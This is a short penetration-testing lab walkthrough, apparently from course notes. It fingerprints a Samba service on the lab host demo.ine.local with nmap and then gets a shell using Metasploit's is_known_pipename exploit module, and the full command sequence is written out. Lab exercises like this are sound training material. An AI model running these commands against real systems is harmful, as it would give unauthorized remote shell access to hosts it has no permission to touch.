# Vulnerable File Sharing Service

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 4687–4715. Examples are lab-specific and need verification.

Samba is a free software re-implementation of the SMB (Server Message Block) networking protocol, and it provides file and print services for various Microsoft Windows clients and can integrate with a Windows Server domain, either as a Primary Domain Controller (PDC) or as a domain member. In this lab, we will see how a vulnerable file-sharing service can be exploited.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

Your task is to fingerprint the application using command line tools available on the Kali terminal and then exploit the application using the appropriate Metasploit module. Get a shell on the target!

**Objective:** Get a shell on the target by exploiting a file-sharing service.

Tools: nmap , msf

```bash

nmap -Pn -A -T4 demo.ine.local
#port 139, 445 samba smbd

msfconsole -q
search type:exploit name : samba
use exploit/linux/samba/is_known_pipename
set RHOST demo.ine.local
check
exploit
id

# successfully obtain shell and In this lab, we learned how to get a shell on the target by exploiting a file-sharing service.

```
